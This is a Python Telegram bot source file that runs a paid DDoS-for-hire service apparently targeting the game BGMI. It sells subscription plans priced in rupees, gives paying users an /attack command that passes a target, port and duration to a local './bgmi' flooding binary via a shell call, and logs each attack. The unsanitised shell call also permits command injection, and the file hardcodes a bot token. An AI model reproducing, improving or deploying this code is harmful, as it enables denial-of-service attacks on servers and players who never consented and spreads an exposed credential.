import telebot
import subprocess
import datetime
import os

bot = telebot.TeleBot('7769584863:AAGS6h2n_Ikm9LJaEqC2wKpzgm7pYvhfI2o')
admin_id = ["5933223752"]

USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"
LOG_FILE = "log.txt"

subscription_periods = {
    '1min': 60,
    '1hour': 3600,
    '6hours': 21600,
    '12hours': 43200,
    '1day': 86400,
    '3days': 259200,
    '7days': 604800,
    '1month': 2592000,
    '2months': 5184000
}

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []     
def read_subscriptions():
    subscriptions = {}
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    user_id = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        subscriptions[user_id] = expiry
                    except ValueError:
                        print(f"Error parsing date for user {user_id}: {expiry_str}")
                else:
                    print(f"Invalid line in subscription file: {line}")
    except FileNotFoundError:
        pass
    return subscriptions
def write_subscriptions(subscriptions):
    with open(SUBSCRIPTION_FILE, "w") as file:
        for user_id, expiry in subscriptions.items():
            file.write(f"{user_id} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
allowed_user_ids = read_users()
subscriptions = read_subscriptions()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def is_subscribed(user_id):
    if user_id in subscriptions:
        if datetime.datetime.now() < subscriptions[user_id]:
            return True
        else:
            del subscriptions[user_id]
            write_subscriptions(subscriptions)
    return False
    
def add_subscription(user_id, duration):
    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    subscriptions[user_id] = expiry
    write_subscriptions(subscriptions)
    
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            period = command[2]
            if period in subscription_periods:
                duration = subscription_periods[period]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                add_subscription(user_to_add, duration)
                response = f"🔑𝐀𝐝𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥"
            else:
                response = "Invalid subscription period. Use: 1min, 1hour, 6hours, 12hours, 1day, 3days, 7days, 1month, or 2months."
        else:
            response = "Please specify a User ID and subscription period to add."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                if user_to_remove in subscriptions:
                    del subscriptions[user_to_remove]
                    write_subscriptions(subscriptions)
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 𝐚 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
        
        bot.reply_to(message, response)
        
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (
        f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: `{target}`\n"
        f"🔌 𝗣𝗼𝗿𝘁: `{port}`\n"
        f"⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: `{time} seconds`\n"
        f"🎮 𝗚𝗮𝗺𝗲: `𝗕𝗚𝗠𝗜`\n"
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/SOULCRACKERS1")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
    
bgmi_cooldown = {}

COOLDOWN_TIME =0

@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
        
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "⏰𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍⏰"
                bot.reply_to(message, response)
                return
         
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 350:
                response = "🔋𝐇𝐈𝐆𝐇 𝐓𝐈𝐌𝐄 𝐋𝐈𝐌𝐈𝐓 𝟑𝟓𝟎"
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 3"
                subprocess.run(full_command, shell=True)
                response = f"✅𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊✅"
        else:
            response = "🚀 Usage :- /attack <target> <port> <time>"
    else:
        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 @VIPMODXOWNER"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!


Pr-ice List:
Day-->50 Rs
Week-->400 Rs
Month-->1000 Rs
🏆𝘽𝙪𝙮 :- @VIPMODXOWNER
🏆𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 :- @SOULCRACKERS1
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "Admin commands:\n"
        response += "/allusers - List all authorized users\n"
        response += "/clearlogs - Clear all command logs\n"
        response += "/remove <user_id> - Remove a user\n"
        bot.reply_to(message, response)
    else:
        response = "🔑𝐀𝐝𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥"
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐘𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃: `{user_id}`"
    bot.reply_to(message, response, parse_mode='Markdown')
   
@bot.message_handler(commands=['Owner'])
def show_help(message):
    response = """@VIPMODXOWNER
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/SOULCRACKERS1'),
        telebot.types.InlineKeyboardButton('Support', url='https://t.me/SOULCRACKERS1')
    )

    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
 
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '/id :--> 🪪𝐂𝐇𝐀𝐓 𝐈𝐃\n'
    response += '/attack :--> 🚀𝐀𝐓𝐓𝐀𝐂𝐊\n'
    response += '/plan :--> 💳𝐏𝐋𝐀𝐍\n'
    response += '/add :--> 🔑𝐀𝐃𝐃\n\n'
    response += '/Owner :--> 🔐𝐎𝐖𝐍𝐄𝐑\n'
    
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('UPDATES', url='https://t.me/SOULCRACKERS1'),
        telebot.types.InlineKeyboardButton('SUPPORT', url='https://t.me/SOULCRACKERS1')  
    )

    bot.reply_to(message, response, reply_markup=keyboard)
    
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)